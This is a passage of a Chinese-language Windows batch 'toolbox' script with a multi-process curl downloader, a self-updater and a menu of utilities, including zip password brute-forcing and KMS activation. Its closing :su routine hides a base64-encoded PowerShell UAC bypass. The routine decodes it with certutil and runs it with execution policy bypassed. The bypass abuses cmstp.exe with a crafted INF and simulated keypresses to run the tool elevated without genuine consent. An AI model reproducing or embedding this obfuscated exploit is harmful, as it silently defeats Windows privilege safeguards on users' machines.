if exist %temp%\tag (del /f /q tag)
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
curl !proxy! -A !ua! -I -# -L -o tag --connect-timeout 5 --output-dir %temp% "!url!"
if not exist %temp%\tag (
echo;_______________________________________________________________________________
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
)
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Accept-Ranges:"') do (set trflag=%%a)
for /f "tokens=2 delims= " %%a in ('type %temp%\tag^|findstr /c:"Content-Length:"') do (set filesize=%%a)
for /f "tokens=2 delims==" %%a in ('type %temp%\tag^|findstr /c:"filename="') do (set filename=%%a)
if "!trflag!" neq "bytes" (set tr=1)
del /f /q %temp%\tag
call :xdwjs !filesize! b dw
if not defined filename (set /p filename=输入文件名: )
if not defined filename (set filename=curl下载文件)
set /a fd=!filesize!/!tr!
set /a ys=%filesize%%%tr%
set oldfd=0
set /a pdtr=!tr!-1
set /a newfd=!fd!-1
set /a pdfd=!fd!+!ys!
set file=
for /l %%a in (1,1,!tr!) do (set file=!file!%%a+)
set newtr=
set /a newtr=!tr!+1
set file=!file:~0,-1!
cls
echo 文件名:		!filename!
echo 文件大小:	!dw!
if "!trflag!" neq "bytes" (echo;该链接不支持多线程传输,进程数自动设置为1)
echo;进程数:		!tr!
echo;传输片段大小:	!fd!+!ys!
echo;保存路径:	!dir!
echo;_______________________________________________________________________________
set /p =按任意键开始下载<nul&pause>nul
cls
echo;开始下载文件...
title curl多进程下载 - 等待文件下载完成(按e返回菜单)%system%
if exist %temp%\down (rd /s /q %temp%\down)
md %temp%\down
set kssj=%time%
for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
	if "%%a" equ "0x1" (
		for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
			set "proxy=-x %%b"
			echo;使用代理:	%%b
		)
	) else (
		set proxy=
	)
)
for /l %%a in (1,1,!tr!) do (
	start /b curl !proxy! -s -A !ua! -# -L -C - --retry 1 --retry-delay 1 --connect-timeout 5 -r !oldfd!-!newfd! -o %%a --output-dir %temp%\down "!url!"
	set /a oldfd=!newfd!+1
	if %%a equ !pdtr! (
		set newfd=
	) else (
		set /a newfd=!oldfd!+!fd!-1
	)
)
pushd %temp%\down
cls
:72.2
(
cls
set /p =!cswz!s!cswz!0;0H<nul
set jccs=
set jingdu=
set /p =!cswz!0;76H<nul
call :colortxt a 等待文件下载完成^(按e返回菜单^)...
set /p =!cswz!u<nul
)
for /l %%a in (1,1,!tr!) do (
	set ssdx=%%~za
	if not defined ssdx (set ssdx=0)
	if %%a equ !tr! (
		if !ssdx! equ !pdfd! (
			echo;进程%%a完成
			set /a jccs=!jccs!+1
		) else (
			set fhz=
			call :cf !ssdx! !pdfd! 2 fhz
			set jcjd=!fhz:~2,2!
			if "!jcjd:~0,1!" equ "0" (
				set jcjd=!jcjd:~1,1!
			)
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (
				set jdt=!jdt!:
			)
			set /p =进程%%a的进度:	[<nul
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	) else (
		if !ssdx! equ !fd! (
			echo;进程%%a完成
			set /a jccs=!jccs!+1
		) else (
			set fhz=
			call :cf !ssdx! !fd! 2 fhz
			set jcjd=!fhz:~2,2!
			if "!jcjd:~0,1!" equ "0" (
				set jcjd=!jcjd:~1,1!
			)
			set jdt=
			for /l %%c in (1,2,!jcjd!) do (
				set jdt=!jdt!:
			)
			set /p =进程%%a的进度:	[<nul
			call :colortxt a !jdt!
			echo;][!fhz!~1]
		)
	)
)
choice /c 1e /t 1 /d 1 >nul
if "!errorlevel!" equ "2" (
	taskkill /im curl.exe /f
	rd /s /q %temp%\down
	popd
	goto memuv2
)
if !jccs! neq !tr! goto 72.2
set jssj=%time%
cls
echo;合并文件中...
if "!dir:~-1!" neq "\" (set dir=!dir!\)
copy /b /z !file! "!dir!!filename!"
rd /s /q %temp%\down
popd
cls
title curl多进程下载%system%
if exist "!dir!!filename!" (
for /f "delims=" %%a in ("!dir!!filename!") do (
call :sjc %kssj% %jssj%
set xzsd=
if "!jgxs:~0,1!" equ "0" (
	set jgxs=!jgxs:~1,1!
)
if "!jgfen:~0,1!" equ "0" (
	set jgfen=!jgfen:~1,1!
)
if "!jgm:~0,1!" equ "0" (
	set jgm=!jgm:~1,1!
)
set /a xzsd=!jgxs!*3600+!jgfen!*60+!jgm!
set xzsd=!xzsd!.!jghm!
echo;计算下载速度...
for /f "delims=" %%a in ('powershell !filesize!/!xzsd!') do (call :xdwjs %%a d dw)
forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
cls
echo;下载完成
echo;链接:		!url!
echo;用时:		!jgxs!小时!jgfen!分钟!jgm!.!jghm!秒
echo;平均下载速度:  !size! !dw!/s
echo;文件:		%%~nxa
if %%~za geq 1024 (
call :xdwjs %%~za b dw
echo;文件大小:	%%~za字节 约!dw!) else (echo 文件大小:	%%~za字节)
echo;保存路径:	%%~dpa
)) else (
forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
timeout /t 1 /nobreak>nul
forfiles /p %~dp0 /m %~nx0 /c "%comspec% /c set /p =0x07<nul"
cls
echo;链接:	!url!
echo;下载失败)
echo;_______________________________________________________________________________
set /p =按任意键返回菜单<nul&pause>nul
goto memuv2
:hash
setlocal
set "url=%1"
set "shuanfa=%2"
if "!shuanfa!" equ "" (set "shuanfa=sha256")
for /f "skip=1 eol=C" %%a in ('"certutil -hashfile !url! !shuanfa!"') do (
	if "%3" neq "" (
		endlocal&set "%3=%%a"
		goto :eof
	) else (
		echo;%%a
		goto :eof
	)
	
)
goto :eof
::for /f "delims=" %%a in ('"powershell get-filehash %url% -algorithm %shuanfa%^|select-object hash^|format-list"') do (set hash=%%a)
::set hash=%hash:~7%
goto :eof
:powershell
powershell -mta -nologo -noprofile -executionpolicy bypass -file "%temp%\powershell.ps1"
goto :eof
:update
setlocal
cls
title 更新DOS工具箱 - 当前版本: %ver%%system%
echo 检查最新版本...
timeout /t 1 /nobreak>nul
if exist %temp%\dostoolupdate (
	del /f /q %temp%\dostoolupdate>nul 2>nul
)
if exist %systemroot%\system32\curl.exe (
	pushd %temp%
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
		if "%%a" equ "0x1" (
			for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
				set "proxy=-x %%b"
				echo;使用代理:	%%b
			)
		) else (
			set proxy=
		)
	)
	echo;使用链接:	!gxurlhost1!
	echo;Host域名:	!githost:~10,-1!
	curl !proxy! !githost! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 !resolve! -o dostoolupdate !gxurlhost1!
	if exist "%temp%\dostoolupdate" (
		for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "host=!githost!"
			set "resolve=!resolve!"
			set "url=!gxdoshost1!"
		)
		popd
		goto updatecheck
	) else (
		echo;使用链接:	!gxurl1!
		curl !proxy! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 -o dostoolupdate !gxurl1!
		if exist "%temp%\dostoolupdate" (
			for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "host="
				set "resolve="
				set "url=!gxdos1!"
			)
			popd
			goto updatecheck
		) else (
			echo;使用链接:	!gxurlhost2!
			echo;Host域名:	!jshost:~10,-1!
			curl !proxy! !jshost! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 !resolve! -o dostoolupdate !gxurlhost2!
			if exist "%temp%\dostoolupdate" (
				for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
					set "gxver=%%a"
					set "doshash=%%b"
					set "host=!jshost!"
					set "resolve=!resolve!"
					set "url=!gxdoshost2!"
				)
				popd
				goto updatecheck
			) else (
				echo;使用链接:	!gxurl2!
				curl !proxy! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 -o dostoolupdate !gxurl2!
				if exist "%temp%\dostoolupdate" (
					for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
						set "gxver=%%a"
						set "doshash=%%b"
						set "host="
						set "resolve="
						set "url=!gxdos2!"
					)
					popd
					goto updatecheck
				) else (
					endlocal
					echo;没有检查到更新版本
					echo;_______________________________________________________________________________
					echo;按任意键返回菜单&pause>nul
					if "!tzwz!" equ "!start!" (
						goto memuv2
					) else (
						goto !tzwz!
					)
				)
			)
		)
	)
) else (
	echo;使用链接:	!gxurl1!
	certutil -urlcache -split -f !gxurl1! %temp%\dostoolupdate
	if exist "%temp%\dostoolupdate" (
		for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
			set "gxver=%%a"
			set "doshash=%%b"
			set "url=!gxdos1!"
		)
		goto updatecheck
	) else (
		echo;使用链接:	!gxurl2!
		certutil -urlcache -split -f !gxurl2! %temp%\dostoolupdate
		if exist "%temp%\dostoolupdate" (
			for /f "delims=: tokens=1,2" %%a in (%temp%\dostoolupdate) do (
				set "gxver=%%a"
				set "doshash=%%b"
				set "url=!gxdos2!"
			)
			goto updatecheck
		) else (
			endlocal
			echo;没有检查到更新版本
			echo;_______________________________________________________________________________
			echo;按任意键返回菜单&pause>nul
			if "!tzwz!" equ "!start!" (
				goto memuv2
			) else (
				goto !tzwz!
			)
		)
	)
)
:updatecheck
cls
set /a "checkver=gxver-ver"
if !checkver! gtr 0 (
	set /p =检查到更新版本: <nul
	call :colortxt a !gxver!
	echo;
	goto startupdate
) else (
	endlocal
	echo;没有检查到更新版本
	echo;_______________________________________________________________________________
	echo;按任意键返回菜单&pause>nul
	if "!tzwz!" equ "!start!" (
		goto memuv2
	) else (
		goto !tzwz!
	)
)
:startupdate
echo 正在下载更新...
timeout /t 1 /nobreak>nul
if exist %temp%\dostool (
	del /f /q %temp%\dostool>nul 2>nul
)
if exist %systemroot%\system32\curl.exe (
	pushd %temp%
	for /f "skip=1 tokens=3 delims= " %%a in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable"') do (
		if "%%a" equ "0x1" (
			for /f "skip=1 tokens=3 delims= " %%b in ('"reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer"') do (
				set "proxy=-x %%b"
				echo;使用代理:	%%b
			)
		) else (
			set proxy=
		)
	)
	echo;使用链接:	!url!
	if defined host (
		echo;Host域名:	%host:~10,-1%
	)
	curl !proxy! !host! -A !ua! -L -# -C - --retry 1 --retry-delay 1 --connect-timeout 5 !resolve! -o dostool !url!
	popd
	call :hash %temp%\dostool sha1
	if /i "!hash!" equ "!doshash!" (
		endlocal
		copy /z /y %temp%\dostool %weizhi%&goto chushihua
	) else (
		call :colortxt c 文件无效
		echo;
		timeout /t 2 /nobreak>nul
		if "!tzwz!" equ "!start!" (
			goto memuv2
		) else (
			goto !tzwz!
		)
	)
) else (
	certutil -urlcache -split -f !url! %temp%\dostool
	call :hash %temp%\dostool sha1
	if /i "!hash!" equ "!doshash!" (
		endlocal
		copy /z /y %temp%\dostool %weizhi%&goto chushihua
	) else (
		call :colortxt c 文件无效
		echo;
		timeout /t 2 /nobreak>nul
		if "!tzwz!" equ "!start!" (
			goto memuv2
		) else (
			goto !tzwz!
		)
	)
)
::bitsadmin /transfer 下载更新中... /priority FOREGROUND https://cdn.jsdelivr.net/gh/Trustedinstall/dostool/dostool.js %weizhi%&start %comspec% /c %0&exit 0
:sjc
set kssj=%1
set jssj=%2
set kssj=%kssj:"=%
set kssj=%kssj: =0%
set kssj=%kssj::=%
set kssj=%kssj:.=%
set jssj=%jssj:"=%
set jssj=%jssj: =0%
set jssj=%jssj::=%
set jssj=%jssj:.=%
set xs=%kssj:~0,2%
set xs1=%jssj:~0,2%
set fen=%kssj:~2,2%
set fen1=%jssj:~2,2%
set miao=%kssj:~4,2%
set miao1=%jssj:~4,2%
set hm=%kssj:~6,2%
set hm1=%jssj:~6,2%
if %xs% lss 10 if %xs% gtr 07 set xs=%xs:0=%
if %xs1% lss 10 if %xs1% gtr 07 set xs1=%xs1:0=%
if %fen% lss 10 if %fen% gtr 07 set fen=%fen:0=%
if %fen1% lss 10 if %fen1% gtr 07 set fen1=%fen1:0=%
if %miao% lss 10 if %miao% gtr 07 set miao=%miao:0=%
if %miao1% lss 10 if %miao1% gtr 07 set miao1=%miao1:0=%
if %hm% lss 10 if %hm% gtr 07 set hm=%hm:0=%
if %hm1% lss 10 if %hm1% gtr 07 set hm1=%hm1:0=%
if %hm1% lss %hm% set/a miao1=%miao1%-1&set/a hm1=%hm1%+100
set/a jghm=%hm1%-%hm%
if %miao1% lss %miao% set/a fen1=%fen1%-1&set/a miao1=%miao1%+60
set/a jgm=%miao1%-%miao%
if %fen1% lss %fen% set/a jgxs1=%jgxs1%-1&set/a fen1=%fen1%+60
set/a jgfen=%fen1%-%fen%
set/a jgxs=%xs1%-%xs%
if %jghm% lss 10 set jghm=0%jghm%
if %jgm% lss 10 set jgm=0%jgm%
if %jgfen% lss 10 set jgfen=0%jgfen%
if %jgxs% lss 10 set jgxs=0%jgxs%
set sjc=
set sjc=%jgxs%%jgfen%%jgm%%jghm%
goto :eof
:zfccda
set zfcgs=0
set zfc=
set zfc=%1
:zfcxh
if "!zfc:~%zfcgs%,1!" equ "" (
	set /a zfcgs-=2
	goto :eof
) else (
	set /a zfcgs+=1
	goto zfcxh
)
goto :eof
:zfccd
set zfc=
set zfc=%1
for /l %%a in (1,1,1000) do (
	if "!zfc:~%%a,1!" equ "" (
		set /a zfcgs=%%a-2
		goto :eof
	) 
)
goto :eof
:strlen
setlocal
set "$=!%1!#"
set N=&for %%a in (4096 2048 1024 512 256 128 64 32 16)do if !$:~%%a!. NEQ . set/aN+=%%a&set $=!$:~%%a!
set $=!$!fedcba9876543210&set/aN+=0x!$:~16,1!
endlocal&If %2. neq . (set/a%2=%N%)else echo %N%
goto :eof
:ys
setlocal
for /f "tokens=1,2,3,4 delims=:." %%a in ("!time!") do (
	set /a "start=1%%a*360000+1%%b*6000+1%%c*100+1%%d"
)
:ys_loop
for /f "tokens=1,2,3,4 delims=:." %%a in ("!time!") do (
	set /a "sub=(1%%a*360000+1%%b*6000+1%%c*100+1%%d)-start"
)
if "!sub!" lss "0" (
	goto :eof
) else (
	if !sub! geq %1 (
		goto :eof
	) else (
		goto ys_loop
	)
)
goto :eof
:dwjs
set blxsws=%3
if not defined blxsws set blxsws=2
set dw=%2
if not defined dw set dw=0
set size=%1
if not defined size goto :eof
set size|findstr "\<[0-9]*\>">nul
if "%errorlevel%" neq "0" goto :eof
:renjs
for /f "delims=" %%a in ('"powershell %size%/1024"') do (set /a dw=%dw%+1&set size=%%a)
set size|findstr "\<0[.]">nul
if "%errorlevel%" equ "0" (set /a dw=%dw%-1
for /f "delims=" %%a in ('"powershell %size%*1024"') do (set size=%%a)
goto next
)
if "%size%" geq "1024" goto renjs
:next
if "%dw%" equ "0" set dw=字节
if "%dw%" equ "1" set dw=KB
if "%dw%" equ "2" set dw=MB
if "%dw%" equ "3" set dw=GB
if "%dw%" equ "4" set dw=TB
if "%dw%" equ "5" set dw=EB
if "%size%" equ "0" set size=
echo !size!|findstr /c:".">nul
if !errorlevel! equ 0 (for /f "tokens=1,2 delims=." %%a in ("!size!") do (
for /f "delims=" %%b in ('powershell '{0:f!blxsws!}' -f !size!') do (set size=%%b)
))
goto :eof
:list
(
set start=1
set a1=清除U盘里的lpk.dll病毒
set a2=清除U盘里的jwgkvsq.vmx病毒，并免疫该病毒
set a3=清理系统垃圾
set a4=显示系统信息
set a5=解除任务管理器被禁用
set a6=显示被隐藏文件^(中了该类病毒后^)
set a7=解除注册表被禁用
set a8=计算开平方
set a9=切换到命令提示符
set a10=将磁盘格式转换为NTFS
set a11=磁盘错误修复
set a12=格式化
set a13=DOS计算器
set a14=解除命令提示符被禁用
set a15=随机数生成器
set a16=清除KHATRA病毒
set a17=打开注册表
set a18=打开控制面板
set a19=打开DirectX诊断工具
set a20=打开计算机管理
set a21=用户管理
set a22=打开组策略
set a23=DOS任务管理器
set a24=文件系统信息查询
set a25=创建指定大小的文件
set a26=免疫U盘病毒
set a27=磁盘碎片整理
set a28=一键删除空文件夹
set a29=ping测试网络延迟
set a30=硬件检测
set a31=读心术
set a32=DOS闹钟
set a33=计时器
set a34=随机密码生成器
set a35=删除每个盘符下的System Volume Information文件夹
set a36=二进制转换器
set a37=文本浏览
set a38=显示计算机与用户的设置
set a39=NTFS压缩
set a40=修改文件权限
set a41=显示开机启动项
set a42=语音阅读器
set a43=批处理文件风险分析
set a44=文件搜索
set a45=修复已损坏的文件
set a46=暴力破解压缩包密码
set a47=Wifi热点
set a48=反编译chm文件
set a49=关闭无响应进程
set a50=文件比较器
set a51=将文字写入剪切板
set a52=打开系统服务设置
set a53=已知年月日计算星期
set a54=查询系统激活状态
set a55=创建指定文件的快捷方式到桌面
set a56=打开系统配置
set a57=字数统计
set a58=创建符号链接
set a59=打开管理控制台
set a60=解除Streams文件锁定
set a61=创建、删除或列出卷装入点
set a62=注册表搜索
set a63=Base64编解码
set a64=8.3短文件名管理
set a65=智能NTFS压缩
set a66=计算文件哈希值
set a67=显示货币汇率
set a68=创建虚拟盘符
set a69=解压msi安装文件
set a70=生成CMD控制台色彩表
set a71=KMS激活Windows
set a72=curl多进程下载
set a73=用域前置参数开启Chromium类浏览器
)
goto :eof
:colortxt
if !winv! equ 0 goto colortxt2
set bj=%1
if "!bj:~1,1!" equ "" (set bj1=!color!&set bj2=!bj!) else (set bj1=!bj:~0,1!&set bj2=!bj:~1,1!)
verify on
pushd %temp%
set /p =%cswz1%<nul>"%2"
findstr /v /a:!bj1!!bj2! /r "^$" "%2" nul
del /f "%2">nul 2>nul
popd
goto :eof
:colortxt2
set bj=%1
set zt=%2
if "!bj:~0,1!" equ "0" set bj1=40;
if "!bj:~0,1!" equ "4" set bj1=41;
if "!bj:~0,1!" equ "2" set bj1=42;
if "!bj:~0,1!" equ "6" set bj1=43;
if "!bj:~0,1!" equ "1" set bj1=44;
if "!bj:~0,1!" equ "5" set bj1=45;
if "!bj:~0,1!" equ "3" set bj1=46;
if "!bj:~0,1!" equ "7" set bj1=47;
if "!bj:~0,1!" equ "8" set bj2=90m
if "!bj:~0,1!" equ "c" set bj2=91m
if "!bj:~0,1!" equ "a" set bj2=92m
if "!bj:~0,1!" equ "e" set bj2=93m
if "!bj:~0,1!" equ "9" set bj2=94m
if "!bj:~0,1!" equ "d" set bj2=95m
if "!bj:~0,1!" equ "b" set bj2=96m
if "!bj:~0,1!" equ "f" set bj2=97m
if "!bj:~1,1!" equ "8" set bj2=90m
if "!bj:~1,1!" equ "c" set bj2=91m
if "!bj:~1,1!" equ "a" set bj2=92m
if "!bj:~1,1!" equ "e" set bj2=93m
if "!bj:~1,1!" equ "9" set bj2=94m
if "!bj:~1,1!" equ "d" set bj2=95m
if "!bj:~1,1!" equ "b" set bj2=96m
if "!bj:~1,1!" equ "f" set bj2=97m
if "!bj:~1,1!" equ "" set bj1=!ysbak:~0,3!
set /p =!cswz!!bj1!!bj2!!zt!!cswz!!ysbak!<nul
goto :eof
:rgb
set brgb=%1
set qrgb=%2
set zt=%3
set brgb=!brgb:.=;!
set qrgb=!qrgb:.=;!
set /p =!cswz!48;2;!brgb!;38;2;!qrgb!m!zt!!cswz!!ysbak!<nul
goto :eof
:su
for /f "delims=" %%a in ('"dir/a/b "%weizhi%""') do (set exe="%%~dpnxa")
(
echo IyBVQUMgQnlwYXNzIHBvYyB1c2luZyBTZW5kS2V5cw0KIyBWZXJzaW9uIDEuMA0K
echo IyBBdXRob3I6IE9kZHZhciBNb2UNCiMgRnVuY3Rpb25zIGJvcnJvd2VkIGZyb206
echo IGh0dHBzOi8vcG93ZXJzaGVsbC5vcmcvZm9ydW1zL3RvcGljL3NlbmRrZXlzLw0K
echo IyBUb2RvOiBIaWRlIHdpbmRvdyBvbiBzY3JlZW4gZm9yIHN0ZWFsdGgNCiMgVG9k
echo bzogTWFrZSBzY3JpcHQgZWRpdCB0aGUgSU5GIGZpbGUgZm9yIGNvbW1hbmQgdG8g
echo aW5qZWN0Li4uDQoNCg0KRnVuY3Rpb24gc2NyaXB0OlNldC1JTkZGaWxlIHsNCltD
echo bWRsZXRCaW5kaW5nKCldDQoJUGFyYW0gKA0KCVtQYXJhbWV0ZXIoSGVscE1lc3Nh
echo Z2U9IlNwZWNpZnkgdGhlIElORiBmaWxlIGxvY2F0aW9uIildDQoJJEluZkZpbGVM
echo b2NhdGlvbiA9ICIkZW52OnRlbXBcQ01TVFAuaW5mIiwNCgkNCglbUGFyYW1ldGVy
echo KEhlbHBNZXNzYWdlPSJTcGVjaWZ5IHRoZSBjb21tYW5kIHRvIGxhdW5jaCBpbiBh
echo IFVBQy1wcml2aWxlZ2VkIHdpbmRvdyIpXQ0KCVtTdHJpbmddJENvbW1hbmRUb0V4
echo ZWN1dGUgPSAn
)>%temp%\1.base
(
echo Jw0KCSkNCg0KJEluZkNvbnRlbnQgPSBAIg0KW3ZlcnNpb25dDQpTaWduYXR1cmU9
echo YCRjaGljYWdvYCQNCkFkdmFuY2VkSU5GPTIuNQ0KDQpbRGVmYXVsdEluc3RhbGxd
echo DQpDdXN0b21EZXN0aW5hdGlvbj1DdXN0SW5zdERlc3RTZWN0aW9uQWxsVXNlcnMN
echo ClJ1blByZVNldHVwQ29tbWFuZHM9UnVuUHJlU2V0dXBDb21tYW5kc1NlY3Rpb24N
echo Cg0KW1J1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uXQ0KOyBDb21tYW5kcyBIZXJl
echo IHdpbGwgYmUgcnVuIEJlZm9yZSBTZXR1cCBCZWdpbnMgdG8gaW5zdGFsbA0KJENv
echo bW1hbmRUb0V4ZWN1dGUNCnRhc2traWxsIC9JTSBjbXN0cC5leGUgL0YNCg0KW0N1
echo c3RJbnN0RGVzdFNlY3Rpb25BbGxVc2Vyc10NCjQ5MDAwLDQ5MDAxPUFsbFVTZXJf
echo TERJRFNlY3Rpb24sIDcNCg0KW0FsbFVTZXJfTERJRFNlY3Rpb25dDQoiSEtMTSIs
echo ICJTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxBcHAg
echo UGF0aHNcQ01NR1IzMi5FWEUiLCAiUHJvZmlsZUluc3RhbGxQYXRoIiwgIiVVbmV4
echo cGVjdGVkRXJyb3IlIiwgIiINCg0KW1N0cmluZ3NdDQpTZXJ2aWNlTmFtZT0iQ29y
echo cFZQTiINClNob3J0U3ZjTmFtZT0iQ29ycFZQTiINCg0KIkANCg0KJEluZkNvbnRl
echo bnQgfCBPdXQtRmlsZSAkSW5mRmlsZUxvY2F0aW9uIC1FbmNvZGluZyBBU0NJSQ0K
echo fQ0KDQoNCkZ1bmN0aW9uIEdldC1Id25kDQp7DQogIFtDbWRsZXRCaW5kaW5nKCld
echo DQogICAgDQogIFBhcmFtDQogICgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
echo ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUp
echo XSBbc3RyaW5nXSAkUHJvY2Vzc05hbWUNCiAgKQ0KICBQcm9jZXNzDQogICAgew0K
echo ICAgICAgICAkRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0gJ1N0b3AnDQogICAgICAg
echo IFRyeSANCiAgICAgICAgew0KICAgICAgICAgICAgJGh3bmQgPSBHZXQtUHJvY2Vz
echo cyAtTmFtZSAkUHJvY2Vzc05hbWUgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9w
echo ZXJ0eSBNYWluV2luZG93SGFuZGxlDQogICAgICAgIH0NCiAgICAgICAgQ2F0Y2gg
echo DQogICAgICAgIHsNCiAgICAgICAgICAgICRod25kID0gJG51bGwNCiAgICAgICAg
echo fQ0KICAgICAgICAkaGFzaCA9IEB7DQogICAgICAgIFByb2Nlc3NOYW1lID0gJFBy
echo b2Nlc3NOYW1lDQogICAgICAgIEh3bmQgICAgICAgID0gJGh3bmQNCiAgICAgICAg
echo fQ0KICAgICAgICANCiAgICBOZXctT2JqZWN0IC1UeXBlTmFtZSBQc09iamVjdCAt
echo UHJvcGVydHkgJGhhc2gNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIFNldC1XaW5kb3dB
echo Y3RpdmUNCnsNCiAgW0NtZGxldEJpbmRpbmcoKV0NCg0KICBQYXJhbQ0KICAoDQog
echo ICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxp
echo bmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0gW3N0cmluZ10gJE5hbWUNCiAgKQ0K
echo ICANCiAgUHJvY2Vzcw0KICB7DQogICAgJG1lbWJlckRlZmluaXRpb24gPSBAJw0K
echo ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0gcHVibGljIHN0YXRpYyBleHRl
echo cm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOw0K
echo ICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVl
echo KV0gcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRGb3JlZ3JvdW5kV2luZG93
echo KEludFB0ciBoV25kKTsNCg0KJ0ANCg0KICAgIEFkZC1UeXBlIC1NZW1iZXJEZWZp
echo bml0aW9uICRtZW1iZXJEZWZpbml0aW9uIC1OYW1lIEFwaSAtTmFtZXNwYWNlIFVz
echo ZXIzMg0KICAgICRod25kID0gR2V0LUh3bmQgLVByb2Nlc3NOYW1lICROYW1lIHwg
echo U2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgSHduZA0KICAgIElmICgkaHdu
echo ZCkgDQogICAgew0KICAgICAgJG9uVG9wID0gTmV3LU9iamVjdCAtVHlwZU5hbWUg
echo U3lzdGVtLkludFB0ciAtQXJndW1lbnRMaXN0ICgwKQ0KICAgICAgW1VzZXIzMi5B
echo cGldOjpTZXRGb3JlZ3JvdW5kV2luZG93KCRod25kKQ0KICAgICAgW1VzZXIzMi5B
echo cGldOjpTaG93V2luZG93KCRod25kLCA1KQ0KICAgIH0NCiAgICBFbHNlIA0KICAg
echo IHsNCiAgICAgIFtzdHJpbmddICRod25kID0gJ04vQScNCiAgICB9DQoNCiAgICAk
echo aGFzaCA9IEB7DQogICAgICBQcm9jZXNzID0gJE5hbWUNCiAgICAgIEh3bmQgICAg
echo PSAkaHduZA0KICAgIH0NCiAgICAgICAgDQogICAgTmV3LU9iamVjdCAtVHlwZU5h
echo bWUgUHNPYmplY3QgLVByb3BlcnR5ICRoYXNoDQogIH0NCn0NCg0KLiBTZXQtSU5G
echo RmlsZQ0KI05lZWRzIFdpbmRvd3MgZm9ybXMNCmFkZC10eXBlIC1Bc3NlbWJseU5h
echo bWUgU3lzdGVtLldpbmRvd3MuRm9ybXMNCklmIChUZXN0LVBhdGggJEluZkZpbGVM
echo b2NhdGlvbikgew0KI0NvbW1hbmQgdG8gcnVuDQokcHMgPSBuZXctb2JqZWN0IHN5
echo c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzc3RhcnRpbmZvICJjOlx3aW5kb3dzXHN5
echo c3RlbTMyXGNtc3RwLmV4ZSINCiRwcy5Bcmd1bWVudHMgPSAiL2F1ICRJbmZGaWxl
echo TG9jYXRpb24iDQokcHMuVXNlU2hlbGxFeGVjdXRlID0gJGZhbHNlDQoNCiNTdGFy
echo dCBpdA0KW3N5c3RlbS5kaWFnbm9zdGljcy5wcm9jZXNzXTo6U3RhcnQoJHBzKQ0K
echo DQpkbw0Kew0KCSMgRG8gbm90aGluZyB1bnRpbCBjbXN0cCBpcyBhbiBhY3RpdmUg
echo d2luZG93DQp9DQp1bnRpbCAoKFNldC1XaW5kb3dBY3RpdmUgY21zdHApLkh3bmQg
echo LW5lIDApDQoNCg0KI0FjdGl2YXRlIHdpbmRvdw0KU2V0LVdpbmRvd0FjdGl2ZSBj
echo bXN0cA0KDQojU2VuZCB0aGUgRW50ZXIga2V5DQpbU3lzdGVtLldpbmRvd3MuRm9y
echo bXMuU2VuZEtleXNdOjpTZW5kV2FpdCgie0VOVEVSfSIpDQp9
)>%temp%\2.base
set /p =%comspec% /c %exe% -ks<nul>%temp%\su.bat
set /p =%temp%\su.bat<nul>%temp%\su.txt
certutil -decode -f "%temp%\1.base" %temp%\1.txt>nul
certutil -decode -f "%temp%\2.base" %temp%\2.txt>nul
copy /b "%temp%\1.txt"+"%temp%\su.txt"+"%temp%\2.txt" "%temp%\bypass.ps1">nul
powershell -mta -nologo -noprofile -executionpolicy bypass -file "%temp%\bypass.ps1">nul
timeout /t 2 /nobreak>nul
